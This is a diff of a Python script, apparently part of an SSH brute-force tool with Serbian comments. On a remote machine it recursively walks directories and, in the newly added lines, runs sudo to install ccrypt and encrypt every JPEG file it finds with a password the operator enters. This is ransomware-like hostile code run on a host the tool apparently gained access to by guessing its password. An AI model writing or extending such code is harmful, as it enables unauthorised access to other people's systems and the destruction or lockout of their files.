@@ -149,35 +149,35 @@ def sendMail(stdout):
 
 
 
-def criptImage(files, client, user, path = ""):
+def criptImage(files, client, user, password, path = ""):
 
     for file in files:
         #Dobijamo tip fajla
-        stdin, stdout, stderr = client.exec_command(f"cd {path}; file {file}") ##""
+        stdin, stdout, stderr = client.exec_command(f"cd {path}; file {file}")
         stdout = stdout.readlines()
         stdString = ''.join(stdout)
 
         if 'directory\n' in stdString:
 
-            print(f"Sada je u {file} i to je tipa {stdString}")
+            #print(f"Sada je u {file} i to je tipa {stdString}")
             file = file.strip()
-            path = path + file + "/"    ##Desktop/Bruteforce/
+            path = path + file + "/" 
             stdin, stdout, stderr = client.exec_command(f"cd {path}; ls")
             stdout = stdout.readlines()
-            criptImage(stdout, client, user, path) ##Desktop/Bruteforce/
+            criptImage(stdout, client, user, password, path) 
             path = ""
 
-        elif 'JPEG' in stdout:
+        elif 'JPEG' in stdString:
+            print(path)
+            print(file)
+            client.exec_command("sudo apt-get install ccrypt")
+            stdin,stdout,stderr = client.exec_command(f"cd {path};sudo -S ccencrypt {file}") ##Ne moze da se unese pasvord iz stdina??
+            stdin.write(password + '\n')
+            stdin.flush()
+            stdin.write(password + '\n')
+            stdin.flush()
+            print(stdout)
             
-            print("JPEG")
-
-
-
-
-
-
-
-
 
 
 
@@ -284,8 +284,9 @@ if __name__ == "__main__":
             sendMail(stdout)
 
         elif(tipKomande == "cript"):
+            password = input("Unesite password enkripcije: ")
             path = ""
-            criptImage(stdout, client, user, path)
+            criptImage(stdout, client, user, password, path)
 
 
 
@@ -298,4 +299,3 @@ if __name__ == "__main__":
     else:
 
         print(f"Sifra nije pronadjena")
-
